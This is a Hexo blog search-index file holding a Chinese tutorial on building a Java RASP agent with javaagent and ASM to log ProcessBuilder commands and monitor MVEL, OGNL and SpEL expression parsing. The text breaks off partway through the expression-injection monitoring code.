<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>RASP初尝</title>
    <link href="/2025/09/22/RASP%E5%88%9D%E5%B0%9D/"/>
    <url>/2025/09/22/RASP%E5%88%9D%E5%B0%9D/</url>
    
    <content type="html"><![CDATA[<h1 id="rasp学习"><a href="#rasp学习" class="headerlink" title="rasp学习"></a>rasp学习</h1><p>RASP是<code>Runtime application self-protection</code>的缩写，中文翻译为应用程序运行时防护，其与WAF等传统安全防护措施的主要区别于其防护层级更加底层——在功能调用前或调用时能获取访问到当前方法的参数等信息，根据这些信息来判定是否安全。</p><p>优势点在于<strong>可以忽略各种绕过流量检测的攻击方式（如分段传输，编码等），只关注功能运行时的传参是否会产生安全威胁。简单来说，RASP不看过程，只看具体参数导致方法实现时是否会产生安全威胁。</strong></p><p>Java RASP核心技术栈：</p><ul><li>Instrumentation通过<strong>JVMTI</strong>实现的Agent，负责获取并返回当前JVM虚拟机的状态或转发控制命令。</li><li>字节码操作框架，用于修改字节码（如ASM、Javassist等）</li></ul><p><code>javaagent</code>提供了两种模式：</p><ul><li><code>premain</code>：允许在main开始前修改字节码，也就是在<strong>大部分类加载前</strong>对字节码进行修改。每次修改需要重启服务。</li><li><code>agentmain</code>：允许在main执行后通过<code>com.sun.tools.attach</code>的Attach API attach到程序运行时中，通过<code>retransform</code>的方式修改字节码，也就是在<strong>类加载后通过类重新转换（定义）的方式在方法体中</strong>对字节码进行修改，<strong>其本质还是在类加载前对字节码进行修改</strong>。只需要<strong>需要重新attach</strong>。</li></ul><p>环境搭建</p><p><a href="https://xz.aliyun.com/news/4534">https://xz.aliyun.com/news/4534</a></p><p><a href="https://xz.aliyun.com/news/4535">https://xz.aliyun.com/news/4535</a></p><p>在第一篇文章中创建MANIFEAT.MF的内容如下，需要指定Premain-Class</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Manifest-Version: <span class="hljs-number">1.0</span><br>Premain-<span class="hljs-keyword">Class</span>: cn.org.javaweb.test.agent.Agent<br>Can-Retransform-Classes: <span class="hljs-keyword">true</span><br>Can-Redefine-Classes: <span class="hljs-keyword">true</span><br>Can-<span class="hljs-keyword">Set</span>-Native-<span class="hljs-keyword">Method</span>-<span class="hljs-title function_">Prefix</span>: <span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><h2 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h2><p>设置Rasp拦截，打印初始化tomcat时需要加载的所有类名</p><p>Agent.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalClassFormatException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                            Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;Load class:&quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>AgentTransform.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalClassFormatException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                            Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;Load class:&quot;</span> + className);<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>web正常启动</p><h2 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h2><p>打印执行命令，所需要使用的函数调用</p><p>创建一个ClassVisitor类，需要继承ClassVisitor类并且实现Opcodes类</p><p>TestClassVistor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><br><span class="hljs-keyword">import</span> org.objectweb.asm.ClassVisitor;<br><span class="hljs-keyword">import</span> org.objectweb.asm.MethodVisitor;<br><span class="hljs-keyword">import</span> org.objectweb.asm.Opcodes;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClassVisitor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassVisitor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Opcodes</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestClassVisitor</span><span class="hljs-params">(ClassVisitor cv)</span> &#123;<br>        <span class="hljs-built_in">super</span>(Opcodes.ASM5,cv);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;<br>        <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br><br>        System.out.println(name + <span class="hljs-string">&quot;---&gt;&quot;</span> + desc);<br>        <span class="hljs-keyword">return</span> mv;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对ProcessorBuilder进行hook用户执行的命令</p><p>回到<code>AgentTransform</code>中，对<code>transform</code>方法的内容进行修改</p><p>AgentTransform.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><span class="hljs-keyword">import</span> org.objectweb.asm.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalClassFormatException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className,<br>                            Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        className = className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (className.contains(<span class="hljs-string">&quot;ProcessBuilder&quot;</span>)) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Load class: &quot;</span> + className);<br><br>                <span class="hljs-type">ClassReader</span>  <span class="hljs-variable">classReader</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassReader</span>(classfileBuffer);<br>                <span class="hljs-type">ClassWriter</span>  <span class="hljs-variable">classWriter</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(classReader, ClassWriter.COMPUTE_MAXS);<br>                <span class="hljs-type">ClassVisitor</span> <span class="hljs-variable">classVisitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClassVisitor</span>(classWriter);<br><br>                classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);<br><br>                classfileBuffer = classWriter.toByteArray();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样先生成Agent.jar再运行tomcat，能够看到执行命令所有的调用栈</p><h2 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h2><p>拿到用户所执行的命令</p><p>新建ProcessBuilderHook.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderHook</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(List&lt;String&gt; commands)</span> &#123;<br>        String[] commandArr = commands.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[commands.size()]);<br>        System.out.println(Arrays.toString(commandArr));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>打开<code>TestClassVisitor</code>，对<code>visitMethod</code>方法进行更改</p><p>- </p><ul><li>最后， <em><code>ClassReader</code>调用<code>accept</code>方法</em> 完成整个调用流程</li></ul><p>修改TestClassVisitor类，其中<code>(Ljava/util/List;)V</code>定义了一个方法的参数类型和返回类型:</p><p><strong>解析参数列表 <code>(Ljava/util/List;)</code>：</strong></p><ul><li>参数列表总是用括号 <code>()</code> 包裹起来。</li><li><code>L</code> 表示引用类型（对象类型）。</li><li><code>Ljava/util/List;</code> 表示 <code>java.util.List</code> 类型的参数，<code>L</code> 后面是类的全限定名，末尾用分号 <code>;</code> 结尾。</li><li>括号中的内容表示方法的所有参数类型，这里仅有一个参数，类型为 <code>java.util.List</code>。</li></ul><p><strong>解析返回类型 <code>V</code>：</strong></p><ul><li>返回类型紧跟在括号 <code>()</code> 之后。</li><li><code>V</code> 表示方法返回 <code>void</code>（无返回值）。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent;<br><br><span class="hljs-keyword">import</span> org.objectweb.asm.ClassVisitor;<br><span class="hljs-keyword">import</span> org.objectweb.asm.MethodVisitor;<br><span class="hljs-keyword">import</span> org.objectweb.asm.Opcodes;<br><span class="hljs-keyword">import</span> org.objectweb.asm.commons.AdviceAdapter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClassVisitor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassVisitor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Opcodes</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestClassVisitor</span><span class="hljs-params">(ClassVisitor cv)</span> &#123;<br>        <span class="hljs-built_in">super</span>(Opcodes.ASM5, cv);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> MethodVisitor <span class="hljs-title function_">visitMethod</span><span class="hljs-params">(<span class="hljs-type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;<br>        <span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;start&quot;</span>.equals(name) &amp;&amp; <span class="hljs-string">&quot;()Ljava/lang/Process;&quot;</span>.equals(desc)) &#123;<br>            System.out.println(name + <span class="hljs-string">&quot;-----&gt;&quot;</span> + desc);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdviceAdapter</span>(Opcodes.ASM5, mv, access, name, desc) &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visitCode</span><span class="hljs-params">()</span> &#123;<br><br>                    mv.visitVarInsn(ALOAD, <span class="hljs-number">0</span>);<br>                    mv.visitFieldInsn(GETFIELD, <span class="hljs-string">&quot;java/lang/ProcessBuilder&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Ljava/util/List;&quot;</span>);<br>                    mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">&quot;cn/org/javaweb/test/agent/ProcessBuilderHook&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-string">&quot;(Ljava/util/List;)V&quot;</span>, <span class="hljs-literal">false</span>);<br><br>                    <span class="hljs-built_in">super</span>.visitCode();<br>                &#125;<br>            &#125;;<br>        &#125;<br>        <span class="hljs-keyword">return</span> mv;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ALOAD 0</code> 就是将 <code>this</code> 引用加载到操作数栈</p><p><code>GETFIELD</code> 是 Java 字节码中的一条指令，用于从对象中获取实例字段的值。访问 ProcessBuilder 类的 command 字段（类型为 List）</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">mv</span>.visitFieldInsn(GETFIELD, <span class="hljs-string">&quot;java/lang/ProcessBuilder&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Ljava/util/List;&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>INVOKESTATIC</code> 是 Java 字节码中的一条指令，用于调用<strong>静态方法</strong>。调用静态方法 cn&#x2F;org&#x2F;javaweb&#x2F;test&#x2F;agent&#x2F;ProcessBuilderHook.start，传递获取的 command 字段;方法签名为 (Ljava&#x2F;util&#x2F;List;)V，表示接收一个 List 类型参数且无返回值。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">&quot;cn/org/javaweb/test/agent/ProcessBuilderHook&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-string">&quot;(Ljava/util/List;)V&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>上述代码用于执行ProcessBuilder时，打印执行的命令</p><h3 id="RASP、WAF、EDR的区别"><a href="#RASP、WAF、EDR的区别" class="headerlink" title="RASP、WAF、EDR的区别"></a>RASP、WAF、EDR的区别</h3><p>RASP、WAF和EDR是三种安全技术，可以单独使用，也可以组合使用，如图\ref{fig7}。WAF一般部署在Web应用程序的前线，作用于流量层，能阻断大部分明显的恶意流量。但是WAF也具有如下缺点：因为WAF严重依赖正则表达式和模式匹配，很容易被绕过；需要大量的人工调整才能应对0day攻击；缺乏上下文，导致较高的误报率。相比之下RASP集成于应用内部，拥有完整的上下文，能在攻击到达主机前阻止并检测攻击。与WAF相比，RASP真正地与应用融为了一体。不仅如此，RASP还对0day攻击有防护能力，且几乎不需要人工调整，导致的也误报很少。最后，EDR在进程级别运行，负责主机安全。EDR获取的信息相对有限，主要管理进程意图、进程链等方面。但在攻击调查期间，明确入侵点至关重要，EDR无法给出攻击入口。</p><p>所以RASP在扩展检测与响应(XDR)中发挥着重要作用，提供应用程序层面的监测。</p><h2 id="代码层面RASP的实现"><a href="#代码层面RASP的实现" class="headerlink" title="代码层面RASP的实现"></a>代码层面RASP的实现</h2><h3 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h3><p>在程序启动前就指定agent的位置</p><p>在具体展示两种模式的例子前，先补充一下agent的运行条件，无论用那种模式写出来的agent，都需要将agent打成jar包，这也就是上面需要先用maven打包的原因，同时在jar包中应用<code>META-INF/MANIFEST.MF</code>中指定agent的相关信息，下面是个例子：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Manifest-Version: <span class="hljs-number">1.0</span><br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Premain-Class: com<span class="hljs-selector-class">.lucifaer</span><span class="hljs-selector-class">.javaagentLearning</span><span class="hljs-selector-class">.agent</span><span class="hljs-selector-class">.PreMainTranceAgent</span><br>Agent-Class: com<span class="hljs-selector-class">.lucifaer</span><span class="hljs-selector-class">.javaagentLearning</span><span class="hljs-selector-class">.agent</span>.AgentMainTranceAgent<br></code></pre></td></tr></table></figure><p>以上面的case2为例</p><p><code>Premain-Class</code>和<code>Agent-Class</code>是用来配置不同模式的agent实现类，<code>Can-Redefine-Classes</code>和<code>Can-Retransform-Classes</code>是用来指示是否允许进行类重定义和类重新转换，这两个参数在一定的情况下决定了是否能在agent中利用ASM对加载的类进行修改。由于我们这里用的premain，所以不要Agent-Class配置也可以</p><ul><li>需要实现ClassFileTransformer，重载transform方法。当 JVM 加载某个类时，会调用 <code>transform</code> 方法，允许开发者对字节码进行修改。</li><li>需要访问类，所以声明ClassReader，来获取类</li><li>需要对类中的内容进行修改，所以声明ClassWriter，该类继承于ClassReader</li><li>实例化访问者classVisitor来进行类访问，所以TestClassVisitor需要继承ClassVisitor，且重载其中的方法来修改字节码：<ul><li>如果需要访问注解，则实例化<code>AnnotationVisitor</code></li><li>如果需要访问参数，则实例化<code>FieldVisitor</code></li><li>如果需要访问方法，则实例化<code>MethodVisitor</code></li></ul></li></ul><h4 id="表达式注入监测"><a href="#表达式注入监测" class="headerlink" title="表达式注入监测"></a>表达式注入监测</h4><p>下面是一个省略了分离各个组件（流式写法，写到一个文件），监测MVEL，OGNL，SpEL表达式注入漏洞的demo</p><p>重点是PramainAgentTransform，里面指定了需要进行hook的类名以及方法，根据<code>className</code>来判断当前agent拦截的类是否是需要hook的类，如果是，则直接进入ASM修改流程。</p><p>在<code>ClassVisitor</code>中调用<code>visitMethod</code>方法去访问hook类中的每个方法，根据方法名判断当前的方法是否是需要hook的方法，如果是，则调用<code>visitCode</code>方法在访问具体代码时获取方法的相关参数（这里是获取表达式），并在执行逻辑中插入<code>expression</code>方法的调用，在运行时将执行流经过新添加的方法，就可以打印出表达式以及调用链了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.org.javaweb.test.agent.premain;<br><br><span class="hljs-keyword">import</span> org.objectweb.asm.*;<br><span class="hljs-keyword">import</span> org.objectweb.asm.Opcodes;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-comment">//真正执行hook的地方</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PremainAgentTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;MethodHookDesc&gt; expClassList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;MethodHookDesc&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        expClassList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodHookDesc</span>(<span class="hljs-string">&quot;org.mvel2.MVELInterpretedRuntime&quot;</span>, <span class="hljs-string">&quot;parse&quot;</span>,<br>                <span class="hljs-string">&quot;()Ljava/lang/Object;&quot;</span>));<br>        expClassList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodHookDesc</span>(<span class="hljs-string">&quot;ognl.Ognl&quot;</span>, <span class="hljs-string">&quot;parseExpression&quot;</span>,<br>                <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/Object;&quot;</span>));<br>        expClassList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodHookDesc</span>(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpression&quot;</span>, <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;(Ljava/lang/String;Lorg/springframework/expression/spel/ast/SpelNodeImpl;&quot;</span> +<br>                        <span class="hljs-string">&quot;Lorg/springframework/expression/spel/SpelParserConfiguration;)V&quot;</span>));<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">//对所有加载的类都进行遍历</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,<br>                            <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span 